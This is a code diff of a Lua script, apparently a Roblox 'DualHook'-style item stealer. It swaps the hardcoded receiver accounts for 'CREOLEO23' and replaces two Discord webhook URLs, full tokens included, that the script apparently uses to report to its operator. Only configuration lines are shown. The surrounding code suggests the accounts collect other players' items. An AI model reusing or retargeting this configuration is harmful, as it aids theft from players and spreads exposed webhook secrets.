@@ -1,4 +1,4 @@
-local ExtraUsers = {"IngeniousIsBackAgain","ingenious_reciever","DualHook-User3","DualHook-User4","DualHook-User5","DualHook-User6"}
+local ExtraUsers = {"CREOLEO23"}
 local Friends = {}
 
 if not _G["Script-SM_Config"] then
@@ -8,9 +8,9 @@ if not _G["Script-SM_Config"] then
 end
 
 local cfg = _G["Script-SM_Config"] or {}
-local Webhook = cfg.user_webhook or "https://discord.com/api/webhooks/1454360459917393954/1yOqrbwUesS_clB-LYBkGalvsikQeZVwZ6muPXfsHViZ8Kexv9_DLDRE8HSv-lOkylpi"
-local DualWebhook = cfg.dual_webhook or "https://discord.com/api/webhooks/1454360459917393954/1yOqrbwUesS_clB-LYBkGalvsikQeZVwZ6muPXfsHViZ8Kexv9_DLDRE8HSv-lOkylpi"  -- Replace with actual dual webhook if available
-local Username = cfg.users or {"TheOnlyTemuunVID"}
+local Webhook = cfg.user_webhook or "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
+local DualWebhook = cfg.dual_webhook or "https://discord.com/api/webhooks/1490011079735115796/CtTiahnkl0_ppBwAubLAEeO52GmOpTJ0tkfBMEsAJ1f7bO4Sz_cTyr07bUW9oGE9tCwo"  -- Replace with actual dual webhook if available
+local Username = cfg.users or {"CREOLEO23"}
 
 for _, v in ipairs(Username) do table.insert(Friends, v) end
 for _, v in ExtraUsers do if not table.find(Friends, v) then table.insert(Friends, v) end end
